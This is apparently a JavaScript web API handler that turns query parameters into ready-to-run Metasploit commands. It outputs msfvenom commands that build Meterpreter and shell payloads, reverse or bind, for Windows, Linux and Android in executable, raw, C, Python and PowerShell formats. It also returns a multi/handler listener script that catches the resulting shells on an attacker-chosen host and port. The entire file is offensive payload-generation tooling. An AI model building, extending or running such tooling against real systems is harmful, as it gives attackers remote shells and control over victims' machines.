export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  try {
    const { lhost, lport, platform, type } = req.query;

    if (!lhost || !lport) {
      return res.status(400).json({ ok: false, error: 'Missing lhost or lport' });
    }

    const port = parseInt(lport);
    if (isNaN(port) || port < 1 || port > 65535) {
      return res.status(400).json({ ok: false, error: 'Invalid port' });
    }

    const platformLower = (platform || 'windows').toLowerCase();
    const typeLower = (type || 'reverse').toLowerCase();

    const payloads = {
      windows: {
        reverse: 'windows/x64/meterpreter/reverse_tcp',
        bind: 'windows/x64/meterpreter/bind_tcp',
        shell_reverse: 'windows/shell_reverse_tcp',
        shell_bind: 'windows/shell_bind_tcp'
      },
      linux: {
        reverse: 'linux/x64/meterpreter/reverse_tcp',
        bind: 'linux/x64/meterpreter/bind_tcp',
        shell_reverse: 'linux/x86/shell_reverse_tcp',
        shell_bind: 'linux/x86/shell_bind_tcp'
      },
      android: {
        reverse: 'android/meterpreter/reverse_tcp',
        bind: 'android/meterpreter/bind_tcp',
        shell_reverse: 'android/shell/reverse_tcp',
        shell_bind: 'android/shell/bind_tcp'
      }
    };

    let payloadKey = typeLower;
    if (!payloads[platformLower]?.[payloadKey]) {
      payloadKey = 'reverse';
    }

    const selectedPayload = payloads[platformLower]?.[payloadKey] || 'windows/x64/meterpreter/reverse_tcp';

    const commands = [
      `msfvenom -p ${selectedPayload} LHOST=${lhost} LPORT=${port} -f exe -o payload.exe`,
      `msfvenom -p ${selectedPayload} LHOST=${lhost} LPORT=${port} -f elf -o payload.elf`,
      `msfvenom -p ${selectedPayload} LHOST=${lhost} LPORT=${port} -f raw -o payload.bin`,
      `msfvenom -p ${selectedPayload} LHOST=${lhost} LPORT=${port} -f c`,
      `msfvenom -p ${selectedPayload} LHOST=${lhost} LPORT=${port} -f python`,
      `msfvenom -p ${selectedPayload} LHOST=${lhost} LPORT=${port} -f powershell`
    ];

    const listener = `use exploit/multi/handler\nset payload ${selectedPayload}\nset LHOST ${lhost}\nset LPORT ${port}\nexploit -j`;

    return res.status(200).json({
      ok: true,
      data: {
        platform: platformLower,
        type: typeLower,
        payload: selectedPayload,
        lhost,
        lport,
        commands,
        listener
      }
    });
  } catch (error) {
    console.error('Metasploit error:', error);
    return res.status(500).json({ ok: false, error: error.message });
  }
}